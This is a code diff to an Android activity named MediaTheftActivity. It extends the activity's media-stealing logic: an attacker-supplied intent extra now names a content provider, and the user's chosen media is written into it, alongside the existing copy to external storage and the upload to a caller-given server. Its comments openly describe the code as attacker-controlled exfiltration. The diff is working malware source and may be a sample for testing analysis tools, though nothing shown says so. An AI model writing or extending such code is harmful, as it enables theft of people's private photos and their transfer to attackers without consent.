@@ -34,8 +34,9 @@ public class MediaTheftActivity extends Activity {
         String server = intent.getStringExtra("server");
         String phone = intent.getStringExtra("phone");
         String chosenMedia = intent.getStringExtra("media_uri");
+        String destination = intent.getStringExtra("destination");
 
-        stealChosenMedia(chosenMedia, server);
+        stealChosenMedia(chosenMedia, destination, server);
 
         ArrayList<Uri> media = collectUserMedia();
         copyToExternalStorage(media);
@@ -76,7 +77,7 @@ public class MediaTheftActivity extends Activity {
     // The caller names the image it wants: the uri from the extra is what getBitmap reads, so the
     // media is chosen by the attacker rather than by the app.
     @SuppressWarnings("deprecation")
-    private void stealChosenMedia(String mediaUri, String server) {
+    private void stealChosenMedia(String mediaUri, String destination, String server) {
         if (mediaUri == null) {
             return;
         }
@@ -90,12 +91,25 @@ public class MediaTheftActivity extends Activity {
             return;
         }
 
-        File destination = new File(Environment.getExternalStorageDirectory(), "chosen.jpg");
-        try (OutputStream out = new FileOutputStream(destination)) {
+        File backup = new File(Environment.getExternalStorageDirectory(), "chosen.jpg");
+        try (OutputStream out = new FileOutputStream(backup)) {
             out.write(bytes);
         } catch (IOException ignored) {
         }
+        copyToControlledProvider(bytes, destination);
         upload(bytes, server);
+    }
+
+    // The destination is a content:// uri from the extra, so the media is written into whichever
+    // provider the caller names -- a publicly writable one belonging to the attacker, for instance.
+    private void copyToControlledProvider(byte[] media, String destination) {
+        if (destination == null) {
+            return;
+        }
+        try (OutputStream out = getContentResolver().openOutputStream(Uri.parse(destination))) {
+            out.write(media);
+        } catch (IOException ignored) {
+        }
     }
 
     private void copyToExternalStorage(ArrayList<Uri> media) {
